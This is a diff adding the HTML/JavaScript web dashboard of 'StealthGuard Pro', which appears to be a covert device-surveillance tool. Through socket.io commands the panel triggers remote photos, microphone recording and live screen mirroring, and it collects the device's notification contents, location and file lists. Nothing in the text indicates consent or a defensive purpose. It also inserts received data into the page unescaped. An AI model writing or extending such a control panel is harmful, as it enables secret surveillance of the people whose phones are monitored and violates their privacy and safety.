@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StealthGuard Pro - Dashboard</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { --primary: #4f46e5; --secondary: #1e293b; --accent: #10b981; --bg: #f8fafc; }
+        body { background-color: var(--bg); font-family: 'Inter', sans-serif; color: #334155; }
+        .sidebar { height: 100vh; background: var(--secondary); color: white; padding: 2rem 1rem; position: fixed; width: 260px; }
+        .main-content { margin-left: 260px; padding: 2rem; }
+        .nav-link { color: #94a3b8; padding: 0.8rem 1.2rem; border-radius: 8px; margin-bottom: 0.5rem; display: flex; align-items: center; text-decoration: none; }
+        .nav-link:hover, .nav-link.active { background: rgba(255,255,255,0.1); color: white; }
+        .card { border: none; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); background: white; margin-bottom: 1.5rem; }
+        #log-container { height: 200px; overflow-y: auto; background: #0f172a; color: #38bdf8; padding: 1rem; font-family: monospace; font-size: 0.8rem; border-radius: 8px; }
+        .status-online { background: #10b981; width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
+        .status-offline { background: #ef4444; width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
+        #screen-canvas { width: 100%; max-width: 400px; border: 2px solid #ddd; border-radius: 10px; background: #000; }
+        .notif-item { padding: 10px; border-bottom: 1px solid #f1f5f9; }
+        .notif-app { font-weight: 600; color: var(--primary); font-size: 0.8rem; }
+    </style>
+</head>
+<body>
+
+    <div class="sidebar">
+        <h4 class="mb-5 px-3 fw-bold"><i class="fas fa-shield-alt me-2"></i>StealthGuard</h4>
+        <nav>
+            <a href="#" class="nav-link active" onclick="showTab('dashboard')"><i class="fas fa-home me-3"></i> Dashboard</a>
+            <a href="#" class="nav-link" onclick="showTab('mirror')"><i class="fas fa-desktop me-3"></i> Screen Mirror</a>
+            <a href="#" class="nav-link" onclick="showTab('notifications')"><i class="fas fa-bell me-3"></i> Notifications</a>
+            <a href="#" class="nav-link" onclick="showTab('location')"><i class="fas fa-map-marker-alt me-3"></i> Location</a>
+            <a href="#" class="nav-link" onclick="showTab('files')"><i class="fas fa-folder-open me-3"></i> Files</a>
+        </nav>
+        <div class="mt-5 p-3 small text-white-50">
+            <span id="status-dot" class="status-offline"></span> <span id="status-text">Offline</span>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <!-- Dashboard -->
+        <div id="dashboard" class="tab-pane active">
+            <h2 class="fw-bold mb-4">Dashboard</h2>
+            <div class="row">
+                <div class="col-md-3">
+                    <div class="card p-3 text-center">
+                        <i class="fas fa-camera fa-2x text-success mb-2"></i>
+                        <h6>Camera</h6>
+                        <button class="btn btn-sm btn-primary" onclick="sendCommand('take_photo')">Snap Photo</button>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="card p-3 text-center">
+                        <i class="fas fa-microphone fa-2x text-danger mb-2"></i>
+                        <h6>Record</h6>
+                        <button class="btn btn-sm btn-outline-danger mb-1" onclick="sendCommand('start_record')">Start</button>
+                        <button class="btn btn-sm btn-danger" onclick="sendCommand('stop_record')">Stop</button>
+                    </div>
+                </div>
+            </div>
+            <div class="card p-3">
+                <h6>Activity Logs</h6>
+                <div id="log-container"></div>
+            </div>
+        </div>
+
+        <!-- Screen Mirror -->
+        <div id="mirror" class="tab-pane d-none">
+            <h2 class="fw-bold mb-4">Live Screen Mirror</h2>
+            <div class="card p-4 text-center">
+                <img id="screen-view" src="" style="max-width: 100%; height: auto; border: 4px solid #333; border-radius: 15px; background: #000; display: none;">
+                <div id="mirror-placeholder" class="p-5 bg-light rounded-4">
+                    <i class="fas fa-tv fa-4x text-muted mb-3"></i>
+                    <p>Screen Mirroring not active</p>
+                </div>
+                <div class="mt-4">
+                    <button class="btn btn-success px-4" onclick="sendCommand('start_mirror')">Start Stream</button>
+                    <button class="btn btn-danger px-4" onclick="sendCommand('stop_mirror')">Stop Stream</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Notifications -->
+        <div id="notifications" class="tab-pane d-none">
+            <h2 class="fw-bold mb-4">Notification Logs</h2>
+            <div class="card">
+                <div id="notif-list" style="max-height: 500px; overflow-y: auto;">
+                    <div class="p-5 text-center text-muted">Waiting for notifications...</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Other tabs (simplified for brevity) -->
+        <div id="location" class="tab-pane d-none"><h2>Location</h2><div id="loc-data" class="card p-3"></div></div>
+        <div id="files" class="tab-pane d-none"><h2>File Manager</h2><button class="btn btn-primary" onclick="sendCommand('list_files')">Load Files</button><div id="file-list" class="card mt-2"></div></div>
+    </div>
+
+    <script>
+        const socket = io({ query: { type: 'web' } });
+
+        socket.on('device_status', (data) => {
+            document.getElementById('status-dot').className = data.connected ? "status-online" : "status-offline";
+            document.getElementById('status-text').innerText = data.connected ? "Online" : "Offline";
+            log("System: Device status updated.");
+        });
+
+        socket.on('notification_data', (data) => {
+            const list = document.getElementById('notif-list');
+            if(list.innerText.includes('Waiting')) list.innerHTML = '';
+            const item = document.createElement('div');
+            item.className = 'notif-item';
+            item.innerHTML = `<div class="notif-app">${data.app}</div><div class="fw-bold">${data.title}</div><div>${data.content}</div>`;
+            list.prepend(item);
+            log(`Notif: ${data.title} from ${data.app}`);
+        });
+
+        socket.on('screen_data', (base64) => {
+            const img = document.getElementById('screen-view');
+            const placeholder = document.getElementById('mirror-placeholder');
+            img.src = 'data:image/jpeg;base64,' + base64;
+            img.style.display = 'inline-block';
+            placeholder.style.display = 'none';
+        });
+
+        function sendCommand(action) {
+            socket.emit('gui_command', { action: action });
+            log("Sent: " + action);
+        }
+
+        function showTab(id) {
+            document.querySelectorAll('.tab-pane').forEach(el => el.classList.add('d-none'));
+            document.getElementById(id).classList.remove('d-none');
+            document.querySelectorAll('.nav-link').forEach(el => el.classList.remove('active'));
+            event.currentTarget.classList.add('active');
+        }
+
+        function log(msg) {
+            const container = document.getElementById('log-container');
+            container.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            container.scrollTop = container.scrollHeight;
+        }
+    </script>
+</body>
+</html>
